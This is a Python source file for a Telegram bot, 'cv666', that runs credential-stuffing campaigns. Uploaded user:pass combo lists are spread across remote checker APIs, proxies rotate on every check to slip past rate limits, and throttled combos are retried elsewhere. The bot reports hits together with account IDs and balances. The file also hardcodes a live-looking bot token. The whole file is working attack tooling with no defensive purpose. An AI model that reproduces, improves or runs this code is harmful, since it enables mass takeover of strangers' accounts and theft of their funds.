#!/usr/bin/env python3
"""
[K] cv666 bot — v4 rate-limit handoff + proxy rotation

Behaviour on rate limit:
  - API returns 429 / RETRY  →  cooldown that API for 60s
  - combo pushed to retry pile
  - retry loop: pick next live API, rotate to next proxy
  - max 3 attempts per combo
  - proxies rotate every check (round-robin, skips last-used)
"""

import asyncio
import io
import json
import os
import time
from collections import defaultdict
from urllib.parse import urlparse

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.error import BadRequest
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes,
)


# ─────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────

DEFAULT_TOKEN  = "9295671778:AAE4XsLRZYI9UhrLWOxypkKGh3iJjnI4dqA"
BOT_TOKEN      = os.getenv("BOT_TOKEN", DEFAULT_TOKEN)
API_TIMEOUT    = int(os.getenv("API_TIMEOUT", "600"))
APIS_FILE      = os.getenv("APIS_FILE", "apis.json")
PROXIES_FILE   = os.getenv("PROXIES_FILE", "proxies.json")
MAX_TG_LEN     = 3800
WAVE_SIZE      = int(os.getenv("WAVE_SIZE", "40"))
COOLDOWN_SECS  = int(os.getenv("COOLDOWN_SECS", "60"))
MAX_RETRIES    = int(os.getenv("MAX_RETRIES", "3"))
WORKERS        = int(os.getenv("WORKERS", "6"))
PROGRESS_EVERY = float(os.getenv("PROGRESS_EVERY", "2.5"))

E_API_OK, E_API_DOWN, E_COOLDOWN = "🟢", "🔴", "🟡"
E_PXY_OK, E_PXY_BEN = "✅", "⚠️"
E_HIT, E_MISS, E_CAPTCHA, E_LOCKED = "🎯", "❌", "🤖", "🔒"
E_CRYPTO, E_ERR, E_RETRY = "⚡", "💥", "🔁"
E_STATS, E_APIS, E_PXY, E_HITS = "📊", "🌐", "🛡️", "🔥"
E_RUN, E_REFRESH, E_BACK, E_BOLT = "▶️", "🔄", "◀️", "⚡"


# ─────────────────────────────────────────────
# GLOBAL STATE
# ─────────────────────────────────────────────

API_HEALTH   = {}
API_COOLDOWN = {}
LOCAL_PROXIES = []
PROXY_IDX     = 0
_apis_cache   = None
_apis_lock    = asyncio.Lock()


# ─────────────────────────────────────────────
# APIS
# ─────────────────────────────────────────────

def normalize_api(url):
    if not url: return None
    url = url.strip()
    if not url: return None
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    url = url.rstrip("/")
    try:
        if not urlparse(url).netloc: return None
    except Exception:
        return None
    return url


def load_apis():
    global _apis_cache
    if _apis_cache is not None: return list(_apis_cache)
    if os.path.exists(APIS_FILE):
        try:
            with open(APIS_FILE) as f:
                data = json.load(f)
            _apis_cache = [a for a in (normalize_api(x) for x in data) if a]
            return list(_apis_cache)
        except Exception: pass
    _apis_cache = []
    return []


def _save_apis(apis):
    with open(APIS_FILE, "w") as f:
        json.dump(apis, f, indent=2)


async def add_apis(urls):
    global _apis_cache
    async with _apis_lock:
        apis = load_apis()
        added = []
        for u in urls:
            n = normalize_api(u)
            if n and n not in apis:
                apis.append(n); added.append(n)
        _apis_cache = apis
        _save_apis(apis)
    return added, apis


async def remove_api(url):
    global _apis_cache
    async with _apis_lock:
        apis = load_apis()
        n = normalize_api(url)
        if n in apis:
            apis.remove(n); _apis_cache = apis; _save_apis(apis)
            return True
    return False


# ─────────────────────────────────────────────
# PROXIES — persisted local rotation
# ─────────────────────────────────────────────

def load_proxies():
    global LOCAL_PROXIES
    if os.path.exists(PROXIES_FILE):
        try:
            with open(PROXIES_FILE) as f:
                LOCAL_PROXIES = [str(p).strip() for p in json.load(f) if p]
        except Exception:
            LOCAL_PROXIES = []
    return LOCAL_PROXIES


def save_proxies():
    with open(PROXIES_FILE, "w") as f:
        json.dump(LOCAL_PROXIES, f, indent=2)


def next_proxy(exclude=None):
    """Round-robin. If exclude matches the next pick, skip to next."""
    global PROXY_IDX
    if not LOCAL_PROXIES: return None
    n = len(LOCAL_PROXIES)
    if exclude and n > 1:
        for _ in range(n):
            p = LOCAL_PROXIES[PROXY_IDX % n]
            PROXY_IDX += 1
            if p != exclude: return p
    p = LOCAL_PROXIES[PROXY_IDX % n]
    PROXY_IDX += 1
    return p


# ─────────────────────────────────────────────
# HEALTH / COOLDOWN
# ─────────────────────────────────────────────

def _probe(url, timeout=6):
    try:
        r = requests.get(f"{url}/health", timeout=timeout)
        if r.status_code == 200:
            return True, f"proxies={r.json().get('proxies_loaded', 0)}"
        return False, f"http {r.status_code}"
    except requests.exceptions.RequestException as e:
        return False, type(e).__name__


def refresh_health(apis):
    return {a: {"alive": _probe(a)[0], "last_check": time.time(),
                "reason": _probe(a)[1] or "?"} for a in apis}


def is_alive(url):
    h = API_HEALTH.get(url)
    if not h: return True
    if time.time() - h["last_check"] > 300: return True
    return h["alive"]


def mark_dead(url, reason=""):
    API_HEALTH[url] = {"alive": False, "last_check": time.time(), "reason": reason}


def mark_alive(url):
    API_HEALTH[url] = {"alive": True, "last_check": time.time(), "reason": "ok"}


def cooldown_api(url, secs=COOLDOWN_SECS):
    API_COOLDOWN[url] = time.time() + secs


def in_cooldown(url):
    return API_COOLDOWN.get(url, 0) > time.time()


def live_apis():
    """Alive AND not cooled down."""
    return [a for a in load_apis() if is_alive(a) and not in_cooldown(a)]


def all_alive_apis():
    return [a for a in load_apis() if is_alive(a)]


# ─────────────────────────────────────────────
# API CALLS
# ─────────────────────────────────────────────

def api_call(base, method, path, timeout=API_TIMEOUT, **kwargs):
    url = f"{base}{path}"
    kwargs.setdefault("timeout", timeout)
    try:
        r = requests.request(method, url, **kwargs)
        try: return r.status_code, r.json(), None
        except Exception: return r.status_code, {"raw": r.text[:500]}, None
    except requests.exceptions.RequestException as e:
        return 0, None, type(e).__name__


def broadcast(method, path, **kwargs):
    apis = load_apis()
    if not apis: return {}
    out = {}
    for a in apis:
        out[a] = api_call(a, method, path, **kwargs)
    return out


# ─────────────────────────────────────────────
# FALLBACK — the core rate-limit handoff
# ─────────────────────────────────────────────

def _is_all_retry(j):
    """Detect MISS-with-all-RETRY-variants (soft rate limit)."""
    if not isinstance(j, dict) or j.get("status") != "MISS":
        return False
    variants = j.get("variants") or []
    if not variants: return False
    return all(v.get("status") == "RETRY" for v in variants)


async def check_with_fallback(combo, max_tries=MAX_RETRIES):
    """Try combo across live APIs, rotate proxy each attempt, cool down rate-limited APIs."""
    last_proxy = None
    tried = []

    for attempt in range(max_tries):
        apis = live_apis()
        if not apis:
            # all cooling — wait for shortest cooldown
            wait = min((API_COOLDOWN.get(a, 0) - time.time()
                        for a in load_apis()), default=0)
            if wait <= 0:
                return {"combo": combo, "status": "ERROR",
                        "note": "all apis cooling"}
            await asyncio.sleep(min(wait + 1, COOLDOWN_SECS))
            apis = live_apis()
            if not apis:
                return {"combo": combo, "status": "ERROR",
                        "note": "all apis cooling after wait"}

        # prefer an API not tried yet
        candidates = [a for a in apis if a not in tried]
        api_url = (candidates or apis)[0]
        tried.append(api_url)

        proxy = next_proxy(exclude=last_proxy)
        last_proxy = proxy

        body = {"combo": combo}
        if proxy: body["proxy"] = proxy

        code, j, err = await asyncio.to_thread(
            api_call, api_url, "POST", "/check", json=body, timeout=90
        )

        # network failure → try next API
        if err or code == 0:
            mark_dead(api_url, err or "net")
            continue

        # rate limit → cooldown + retry
        if code == 429 or (j and j.get("status") == "RETRY") or _is_all_retry(j):
            cooldown_api(api_url, COOLDOWN_SECS)
            continue

        # valid response (HIT / MISS / CAPTCHA / LOCKED / CRYPTO_ERR)
        if code == 200 and j:
            mark_alive(api_url)
            j["_api"] = api_url
            j["_proxy_used"] = proxy or "direct"
            j["_attempts"] = attempt + 1
            return j

        # other HTTP error → try next
        continue

    return {"combo": combo, "status": "ERROR",
            "note": "all retries failed", "attempts": tried}


# ─────────────────────────────────────────────
# SPLIT / AGGREGATE
# ─────────────────────────────────────────────

def split_combos(combos, n):
    if n <= 0: return []
    if n >= len(combos): return [[c] for c in combos]
    chunks = [[] for _ in range(n)]
    for i, c in enumerate(combos):
        chunks[i % n].append(c)
    return [c for c in chunks if c]


def aggregate(all_results):
    seen = {}
    for r in all_results:
        c = r.get("combo")
        if not c: continue
        if c not in seen or (r.get("status") == "HIT"
                             and seen[c].get("status") != "HIT"):
            seen[c] = r
    return list(seen.values())


# ─────────────────────────────────────────────
# RENDER — dashboard
# ─────────────────────────────────────────────

def render_dashboard():
    apis = load_apis()
    alive = sum(1 for a in apis if is_alive(a))
    cool = sum(1 for a in apis if in_cooldown(a))
    hits = _cached_hits(apis)
    px = len(LOCAL_PROXIES)
    text = (
        f"*{E_BOLT} cv666 dashboard*\n\n"
        f"{E_APIS} apis   `{alive}/{len(apis)}` alive  "
        f"`{cool}` cooling\n"
        f"{E_PXY} proxies `{px}` loaded\n"
        f"{E_HITS} hits   `{hits}`\n\n"
        "_tap to navigate_"
    )
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton(f"{E_APIS} APIs",     callback_data="dash:apis"),
         InlineKeyboardButton(f"{E_PXY} Proxies",   callback_data="dash:pxy"),
         InlineKeyboardButton(f"{E_HITS} Hits",     callback_data="dash:hits")],
        [InlineKeyboardButton(f"{E_STATS} Stats",   callback_data="dash:stats"),
         InlineKeyboardButton(f"{E_REFRESH} Refresh",callback_data="dash:refresh")],
        [InlineKeyboardButton(f"{E_RUN} Run — reply .txt /chk",
                              callback_data="dash:runhint")],
    ])
    return text, kb


def _cached_hits(apis):
    for a in apis[:1]:
        if not is_alive(a): continue
        code, j, _ = api_call(a, "GET", "/hits", timeout=8)
        if code == 200 and j: return j.get("count", 0)
    return 0


def render_apis():
    apis = load_apis()
    if not apis: return "_no APIs — `/addapi <url>`_", _back_kb()
    lines = [f"*{E_APIS} APIs*", ""]
    for i, a in enumerate(apis, 1):
        h = API_HEALTH.get(a) or {}
        if in_cooldown(a):
            e = E_COOLDOWN; tag = f"cool {int(API_COOLDOWN[a]-time.time())}s"
        elif h.get("alive") is False:
            e = E_API_DOWN; tag = h.get("reason", "dead")[:30]
        else:
            e = E_API_OK; tag = h.get("reason", "ok")[:30]
        lines.append(f"{e} `{i}.` {tag:<30} `{a}`")
    return "\n".join(lines), _back_kb()


def render_pxy():
    apis = load_apis()
    lines = [f"*{E_PXY} Proxies — local rotation*",
             f"`{len(LOCAL_PROXIES)}` loaded · idx `{PROXY_IDX % max(1,len(LOCAL_PROXIES))}`", ""]
    for i, p in enumerate(LOCAL_PROXIES[:15], 1):
        lines.append(f"`{i}.` {E_PXY_OK} `{p[:60]}`")
    if len(LOCAL_PROXIES) > 15:
        lines.append(f"… +{len(LOCAL_PROXIES)-15} more")
    if not LOCAL_PROXIES:
        lines.append("_reply .txt with /addpxy to load_")

    if apis:
        base = next((a for a in apis if is_alive(a)), apis[0])
        code, j, err = api_call(base, "GET", "/proxies", timeout=8)
        if code == 200 and j:
            pool = j.get("pool", [])
            lines.append(f"\n*api pool* `{base.split('//')[1][:28]}` "
                         f"({len(pool)} loaded)")
            for p in pool[:8]:
                e = E_PXY_BEN if p.get("benched") else E_PXY_OK
                lines.append(f"{e} ok={p.get('ok',0):<3} fail={p.get('fail',0):<3} "
                             f"`{p['proxy'][:40]}`")
    return "\n".join(lines), _back_kb()


def render_hits():
    apis = load_apis()
    if not apis: return "_no APIs_", _back_kb()
    merged = {}
    for a in apis:
        if not is_alive(a): continue
        code, j, _ = api_call(a, "GET", "/hits", timeout=8)
        if code == 200 and j:
            for h in j.get("hits", []):
                if h.get("combo"): merged[h["combo"]] = h
    if not merged: return f"{E_HITS} *no hits yet*", _back_kb()
    lines = [f"*{E_HITS} {len(merged)} unique hits*", ""]
    for c, h in list(merged.items())[-25:]:
        info = h.get("info") or {}
        lines.append(f"{E_HIT} `{c}` — `{info.get('balance','?')}"
                     f"{info.get('currency','')}`")
    if len(merged) > 25:
        lines.append(f"… +{len(merged)-25} more")
    return "\n".join(lines), _back_kb()


def render_stats():
    apis = load_apis()
    if not apis: return "_no APIs_", _back_kb()
    lines = [f"*{E_STATS} liveness*", ""]
    for a in apis:
        h = API_HEALTH.get(a) or {}
        if in_cooldown(a):
            e = E_COOLDOWN; tag = f"cool {int(API_COOLDOWN[a]-time.time())}s"
        elif h.get("alive") is False:
            e = E_API_DOWN; tag = h.get("reason", "?")[:40]
        else:
            e = E_API_OK; tag = h.get("reason", "ok")[:40]
        lines.append(f"{e} `{tag}`\n   `{a}`")
    return "\n".join(lines), _back_kb()


def _back_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton(f"{E_BACK} back",
                                                       callback_data="dash:refresh")]])


# ─────────────────────────────────────────────
# RENDER — live progress
# ─────────────────────────────────────────────

def _bar(done, total, w=14):
    if total <= 0: return "░" * w
    f = int(w * done / total)
    return "█" * f + "░" * (w - f)


def render_progress(state):
    total = state["total"]
    done  = state["completed"]
    pct   = (done / total * 100) if total else 0
    elapsed = time.time() - state["started"]
    rate = done / elapsed if elapsed > 0 else 0
    eta  = (total - done) / rate if rate > 0 else 0
    st = state["stats"]
    retry_phase = state["phase"] == "retry"
    phase_tag = f"{E_RETRY} retry phase" if retry_phase else f"{E_BOLT} batch phase"

    lines = [
        f"*{phase_tag}*",
        f"`[{_bar(done, total)}]` {pct:5.1f}%  {done}/{total}",
        f"{E_HIT} HIT `{st.get('HIT',0)}`  {E_MISS} MISS `{st.get('MISS',0)}`  "
        f"{E_CAPTCHA} CAPT `{st.get('CAPTCHA',0)}`",
        f"{E_LOCKED} LOCK `{st.get('LOCKED',0)}`  "
        f"{E_CRYPTO} CRYPTO `{st.get('CRYPTO_ERR',0)}`  "
        f"{E_ERR} ERR `{st.get('ERROR',0)}`",
        f"⏱ {int(elapsed)}s · ETA ~{int(eta)}s"
        + (f" · retry queue `{state.get('retry_pending',0)}`" if retry_phase else ""),
        "",
        "*apis*",
    ]
    for a in load_apis():
        h = API_HEALTH.get(a) or {}
        if in_cooldown(a):
            e = E_COOLDOWN
            tag = f"cool {int(API_COOLDOWN[a]-time.time())}s"
        elif h.get("alive") is False:
            e = E_API_DOWN; tag = "dead"
        else:
            e = E_API_OK; tag = "ok"
        short = a.split("//")[1][:24] if "//" in a else a[:24]
        lines.append(f"{e} `{short:<24}` {tag}")

    return "\n".join(lines)


# ─────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────

def chunk_lines(text, limit=MAX_TG_LEN):
    out, buf = [], ""
    for line in text.splitlines(keepends=True):
        if len(buf) + len(line) > limit:
            if buf: out.append(buf); buf = ""
            while len(line) > limit:
                out.append(line[:limit]); line = line[limit:]
        buf += line
    if buf: out.append(buf)
    return out


async def safe_edit(msg, text, kb=None):
    try:
        await msg.edit_text(text, parse_mode=ParseMode.MARKDOWN,
                            reply_markup=kb, disable_web_page_preview=True)
    except BadRequest as e:
        if "not modified" not in str(e).lower(): raise


# ─────────────────────────────────────────────
# COMMANDS
# ─────────────────────────────────────────────

async def cmd_start(update, ctx):
    text, kb = render_dashboard()
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN,
                                    reply_markup=kb,
                                    disable_web_page_preview=True)


async def cmd_menu(update, ctx):
    await cmd_start(update, ctx)


async def cmd_addapi(update, ctx):
    msg = update.message
    urls = []
    if msg.reply_to_message and msg.reply_to_message.document:
        doc = msg.reply_to_message.document
        if doc.file_name.lower().endswith(".txt"):
            status = await msg.reply_text(f"{E_REFRESH} fetching...")
            tg = await doc.get_file()
            buf = io.BytesIO(); await tg.download_to_memory(buf)
            urls = [ln.strip() for ln in
                    buf.getvalue().decode("utf-8","ignore").splitlines()
                    if ln.strip() and not ln.startswith("#")]
            await status.delete()
    if ctx.args: urls.extend(ctx.args)
    if not urls:
        apis = load_apis()
        await msg.reply_text(
            f"*{E_APIS} {len(apis)} apis*\n\n"
            "`/addapi https://api1.onrender.com`\n"
            "or reply to `.txt` with `/addapi`",
            parse_mode=ParseMode.MARKDOWN)
        return

    added, apis = await add_apis(urls)
    if added:
        status = await msg.reply_text(f"{E_REFRESH} probing {len(added)}...")
        API_HEALTH.update(await asyncio.to_thread(refresh_health, added))
        await status.delete()

    lines = [f"*added {len(added)}* / total *{len(apis)}*\n"]
    for a in added:
        h = API_HEALTH.get(a) or {}
        e = E_API_OK if h.get("alive") else E_API_DOWN
        lines.append(f"{e} {h.get('reason','?')[:30]:<30} `{a}`")
    await msg.reply_text("\n".join(lines), parse_mode=ParseMode.MARKDOWN)


async def cmd_apis(update, ctx):
    apis = load_apis()
    if apis:
        status = await update.message.reply_text(f"{E_REFRESH} probing...")
        API_HEALTH.update(await asyncio.to_thread(refresh_health, apis))
        await status.delete()
    text, kb = render_apis()
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)


async def cmd_rmapi(update, ctx):
    if not ctx.args:
        await update.message.reply_text("usage: `/rmapi <url>`",
                                        parse_mode=ParseMode.MARKDOWN)
        return
    ok = await remove_api(ctx.args[0])
    await update.message.reply_text(
        f"{'✅ removed' if ok else '❌ not found'} `{normalize_api(ctx.args[0])}`",
        parse_mode=ParseMode.MARKDOWN)


async def cmd_stats(update, ctx):
    apis = load_apis()
    if apis:
        status = await update.message.reply_text(f"{E_REFRESH} probing...")
        API_HEALTH.update(await asyncio.to_thread(refresh_health, apis))
        await status.delete()
    text, kb = render_stats()
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)


async def cmd_pxy(update, ctx):
    text, kb = render_pxy()
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=kb)


async def cmd_addpxy(update, ctx):
    msg = update.message
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text(f"reply to `.txt` with `/addpxy`",
                             parse_mode=ParseMode.MARKDOWN)
        return
    doc = msg.reply_to_message.document
    if not doc.file_name.lower().endswith(".txt"):
        await msg.reply_text("only `.txt`", parse_mode=ParseMode.MARKDOWN)
        return

    status = await msg.reply_text(f"{E_REFRESH} fetching proxy file...")
    tg = await doc.get_file()
    buf = io.BytesIO(); await tg.download_to_memory(buf)
    raw = buf.getvalue().decode("utf-8","ignore")
    new_proxies = [ln.strip() for ln in raw.splitlines()
                   if ln.strip() and not ln.startswith("#")]
    if not new_proxies:
        await safe_edit(status, "no proxies in file"); return

    # save locally + persist
    LOCAL_PROXIES.clear()
    LOCAL_PROXIES.extend(new_proxies)
    save_proxies()

    # broadcast to all APIs too
    apis = load_apis()
    if apis:
        await safe_edit(status,
            f"{E_REFRESH} saved `{len(new_proxies)}` local · broadcasting to `{len(apis)}` api(s)...")
        results = await asyncio.to_thread(broadcast, "POST", "/proxies",
                                          json={"proxies": new_proxies})
    else:
        results = {}

    lines = [f"*{E_PXY} loaded `{len(new_proxies)}` proxies locally*",
             f"rotation index reset · combo runs will cycle every check", ""]
    for a, (code, j, err) in results.items():
        if err:
            mark_dead(a, err); lines.append(f"{E_ERR} `{a}` — {err}")
        elif code == 200:
            mark_alive(a); lines.append(f"{E_API_OK} `{a}` loaded={j.get('count','?')}")
        else:
            lines.append(f"{E_ERR} `{a}` http {code}")
    await safe_edit(status, "\n".join(lines))


async def cmd_clearpool(update, ctx):
    global PROXY_IDX
    LOCAL_PROXIES.clear()
    save_proxies()
    PROXY_IDX = 0
    await update.message.reply_text(f"✅ local proxy pool cleared",
                                    parse_mode=ParseMode.MARKDOWN)


async def cmd_clearcool(update, ctx):
    API_COOLDOWN.clear()
    await update.message.reply_text(f"✅ all api cooldowns cleared",
                                    parse_mode=ParseMode.MARKDOWN)


async def cmd_check(update, ctx):
    args = ctx.args or []
    if not args or ":" not in args[0]:
        await update.message.reply_text("usage: `/check user:pass [proxy]`",
                                        parse_mode=ParseMode.MARKDOWN)
        return
    combo = args[0]
    explicit_proxy = args[1] if len(args) > 1 else None

    if explicit_proxy:
        # single-shot with explicit proxy, use check_with_fallback with that proxy
        status = await update.message.reply_text(f"{E_REFRESH} checking...")
        # manual single request
        apis = live_apis() or all_alive_apis()
        if not apis:
            await safe_edit(status, f"{E_ERR} no alive apis"); return
        api_url = apis[0]
        code, j, err = await asyncio.to_thread(
            api_call, api_url, "POST", "/check",
            json={"combo": combo, "proxy": explicit_proxy}, timeout=120)
        if code == 429 or (j and j.get("status") == "RETRY"):
            cooldown_api(api_url)
            await safe_edit(status, f"{E_RETRY} rate limited — api cooled down. retry later.")
            return
        if code != 200 or not j:
            await safe_edit(status, f"{E_ERR} `{err or code}`"); return
    else:
        status = await update.message.reply_text(f"{E_REFRESH} checking (fallback)...")
        j = await check_with_fallback(combo, max_tries=MAX_RETRIES)
        if j.get("status") == "ERROR":
            await safe_edit(status, f"{E_ERR} {j.get('note','?')}\n`{j}`")
            return

    st = j.get("status", "?")
    api_used = j.get("_api", "?")
    proxy_used = j.get("_proxy_used", "?")
    attempts = j.get("_attempts", 1)

    if st == "HIT":
        info = j.get("info") or {}
        out = (
            f"{E_HIT} *HIT*  field=`{j.get('field','?')}`\n"
            f"combo: `{combo}`\n"
            f"api: `{api_used}`\n"
            f"proxy: `{proxy_used}`\n"
            f"attempts: `{attempts}`\n\n"
            f"```\n{str(info)[:1500]}\n```")
    elif st == "MISS":
        vs = j.get("variants") or []
        vl = [f"{v.get('field','?'):<10} {v.get('status','?'):<12} "
              f"{str(v.get('note',''))[:50]}" for v in vs]
        out = (
            f"{E_MISS} *MISS*\ncombo: `{combo}`\n"
            f"api: `{api_used}`\nproxy: `{proxy_used}`\nattempts: `{attempts}`\n\n"
            f"```\n" + "\n".join(vl)[:1800] + "\n```")
    else:
        out = f"*{st}*\napi: `{api_used}`\nproxy: `{proxy_used}`\n```{str(j)[:1200]}```"
    await safe_edit(status, out)


async def cmd_chk(update, ctx):
    msg = update.message
    if not msg.reply_to_message or not msg.reply_to_message.document:
        await msg.reply_text(f"reply to `.txt` with `/chk`",
                             parse_mode=ParseMode.MARKDOWN)
        return
    doc = msg.reply_to_message.document
    if not doc.file_name.lower().endswith(".txt"):
        await msg.reply_text("only `.txt`", parse_mode=ParseMode.MARKDOWN)
        return
    apis = load_apis()
    if not apis:
        await msg.reply_text("no apis — `/addapi <url>` first",
                             parse_mode=ParseMode.MARKDOWN)
        return

    status = await msg.reply_text(f"{E_REFRESH} fetching combo file...")
    tg = await doc.get_file()
    buf = io.BytesIO(); await tg.download_to_memory(buf)
    raw = buf.getvalue().decode("utf-8","ignore")
    combos = [ln.strip() for ln in raw.splitlines()
              if ln.strip() and not ln.startswith("#")]
    if not combos:
        await safe_edit(status, "no combos in file"); return

    # state for progress
    state = {
        "total":       len(combos),
        "completed":   0,
        "retry_pending": 0,
        "stats":       defaultdict(int),
        "started":     time.time(),
        "phase":       "batch",
    }

    # background progress reporter
    stop = asyncio.Event()
    async def reporter():
        last = ""
        while not stop.is_set():
            try:
                t = render_progress(state)
                if t != last:
                    await safe_edit(status, t); last = t
            except Exception: pass
            try:
                await asyncio.wait_for(stop.wait(), timeout=PROGRESS_EVERY)
                return
            except asyncio.TimeoutError: pass
    reporter_task = asyncio.create_task(reporter())

    all_results = []
    retry_combos = []
    waves = [combos[i:i+WAVE_SIZE] for i in range(0, len(combos), WAVE_SIZE)]

    # ── PHASE 1: batch fast path ──
    for wave in waves:
        live = live_apis()
        if not live:
            # wait one cooldown cycle
            wait = min((API_COOLDOWN.get(a, 0) - time.time()
                        for a in load_apis()), default=0)
            if wait > 0:
                await asyncio.sleep(min(wait + 1, COOLDOWN_SECS))
            live = live_apis()
            if not live:
                # give up on this wave → push to retry
                retry_combos.extend(wave)
                state["completed"] += len(wave)
                state["retry_pending"] += len(wave)
                continue

        chunks = split_combos(wave, len(live))
        assign = list(zip(live, chunks))

        async def run_one(api_url, chunk):
            # assign fresh proxies to this API's batch
            sub_px = []
            for _ in chunk:
                p = next_proxy()
                if p and p not in sub_px: sub_px.append(p)
            body = {"combos": chunk, "threads": 2}
            if sub_px: body["proxies"] = sub_px
            return await asyncio.to_thread(
                api_call, api_url, "POST", "/combo",
                json=body, timeout=API_TIMEOUT)

        responses = await asyncio.gather(
            *[run_one(a, c) for a, c in assign], return_exceptions=True)

        for (api_url, chunk), resp in zip(assign, responses):
            if isinstance(resp, Exception):
                mark_dead(api_url, str(resp))
                retry_combos.extend(chunk)
                state["completed"] += len(chunk)
                state["retry_pending"] += len(chunk)
                continue
            code, j, err = resp

            if err or code == 0:
                mark_dead(api_url, err or "net")
                retry_combos.extend(chunk)
                state["completed"] += len(chunk)
                state["retry_pending"] += len(chunk)
                continue
            if code == 429:
                cooldown_api(api_url, COOLDOWN_SECS)
                retry_combos.extend(chunk)
                state["completed"] += len(chunk)
                state["retry_pending"] += len(chunk)
                continue
            if code != 200 or not j:
                mark_dead(api_url, f"http {code}")
                retry_combos.extend(chunk)
                state["completed"] += len(chunk)
                state["retry_pending"] += len(chunk)
                continue

            mark_alive(api_url)
            for r in (j.get("results") or []):
                if r.get("status") == "RETRY":
                    retry_combos.append(r["combo"])
                    state["completed"] += 1
                    state["retry_pending"] += 1
                else:
                    all_results.append(r)
                    state["stats"][r.get("status","ERROR")] += 1
                    state["completed"] += 1

    # ── PHASE 2: retry pile via fallback ──
    if retry_combos:
        state["phase"] = "retry"
        sem = asyncio.Semaphore(WORKERS)

        async def do_retry(combo):
            async with sem:
                r = await check_with_fallback(combo, max_tries=MAX_RETRIES)
                st = r.get("status", "ERROR")
                state["stats"][st] += 1
                state["completed"] += 1
                state["retry_pending"] = max(0, state["retry_pending"] - 1)
                return r

        retry_results = await asyncio.gather(
            *[do_retry(c) for c in retry_combos])
        all_results.extend(retry_results)

    stop.set()
    await reporter_task

    # ── finalize ──
    merged = aggregate(all_results)
    hits = [r for r in merged if r.get("status") == "HIT"]
    elapsed = int(time.time() - state["started"])
    st = state["stats"]

    final = [
        f"*{E_BOLT} done in {elapsed}s*  "
        f"{E_HIT} `{st.get('HIT',0)}`  "
        f"{E_MISS} `{st.get('MISS',0)}`  "
        f"{E_CAPTCHA} `{st.get('CAPTCHA',0)}`",
        f"{E_LOCKED} `{st.get('LOCKED',0)}`  "
        f"{E_CRYPTO} `{st.get('CRYPTO_ERR',0)}`  "
        f"{E_ERR} `{st.get('ERROR',0)}`",
        "",
        f"apis alive: `{len(all_alive_apis())}/{len(load_apis())}`",
        f"proxies used: `{len(LOCAL_PROXIES)}`",
    ]
    await safe_edit(status, "\n".join(final))

    if hits:
        lines = []
        for h in hits:
            info = h.get("info") or {}
            lines.append(f"{h.get('combo')}\t"
                         f"id={info.get('userId', info.get('id','?'))}\t"
                         f"bal={info.get('balance','?')}{info.get('currency','')}")
        blob = "\n".join(lines).encode()
        await msg.reply_document(
            document=io.BytesIO(blob),
            filename=f"hits_{int(time.time())}.txt",
            caption=f"{E_HITS} *{len(hits)} hits*",
            parse_mode=ParseMode.MARKDOWN)


async def cmd_hits(update, ctx):
    text, kb = render_hits()
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN,
                                    reply_markup=kb,
                                    disable_web_page_preview=True)


async def cmd_clearlist(update, ctx):
    apis = load_apis()
    if not apis:
        await update.message.reply_text("no apis"); return
    status = await update.message.reply_text(f"{E_REFRESH} clearing...")
    results = await asyncio.to_thread(broadcast, "DELETE", "/hits", timeout=30)
    ok = sum(1 for code, _, err in results.values() if code == 200 and not err)
    await safe_edit(status, f"✅ cleared {ok}/{len(apis)} apis")


async def cmd_dashboard(update, ctx):
    await cmd_start(update, ctx)


# ─────────────────────────────────────────────
# CALLBACKS
# ─────────────────────────────────────────────

async def cb_dashboard(update, ctx):
    q = update.callback_query
    await q.answer()
    action = q.data.split(":", 1)[1]
    if action == "apis":      text, kb = render_apis()
    elif action == "pxy":     text, kb = render_pxy()
    elif action == "hits":    text, kb = render_hits()
    elif action == "stats":   text, kb = render_stats()
    elif action == "runhint":
        text = (f"{E_RUN} *to run*\n\n"
                f"1. upload `.txt` of `user:pass`\n"
                f"2. reply to it with `/chk`\n\n"
                f"rate-limited combos auto-retry on other apis with fresh proxies.")
        kb = _back_kb()
    else:                     text, kb = render_dashboard()
    try:
        await q.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
                                  reply_markup=kb,
                                  disable_web_page_preview=True)
    except BadRequest as e:
        if "not modified" not in str(e).lower(): raise


async def on_unknown(update, ctx):
    await update.message.reply_text("unknown — /menu")


# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────

def main():
    if not BOT_TOKEN:
        print("[!] BOT_TOKEN required"); return

    apis = load_apis()
    px = load_proxies()
    print(f"[K] {len(apis)} apis · {len(px)} proxies")
    if apis:
        print("[*] probing...")
        API_HEALTH.update(refresh_health(apis))
        alive = sum(1 for h in API_HEALTH.values() if h["alive"])
        print(f"[*] {alive}/{len(apis)} alive")

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_menu))
    app.add_handler(CommandHandler("dashboard", cmd_dashboard))
    app.add_handler(CommandHandler("addapi", cmd_addapi))
    app.add_handler(CommandHandler("apis", cmd_apis))
    app.add_handler(CommandHandler("rmapi", cmd_rmapi))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("addpxy", cmd_addpxy))
    app.add_handler(CommandHandler("pxy", cmd_pxy))
    app.add_handler(CommandHandler("clearpool", cmd_clearpool))
    app.add_handler(CommandHandler("clearcool", cmd_clearcool))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CommandHandler("chk", cmd_chk))
    app.add_handler(CommandHandler("hits", cmd_hits))
    app.add_handler(CommandHandler("clearlist", cmd_clearlist))
    app.add_handler(CallbackQueryHandler(cb_dashboard, pattern=r"^dash:"))
    app.add_handler(MessageHandler(filters.COMMAND, on_unknown))

    print("[K] polling")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


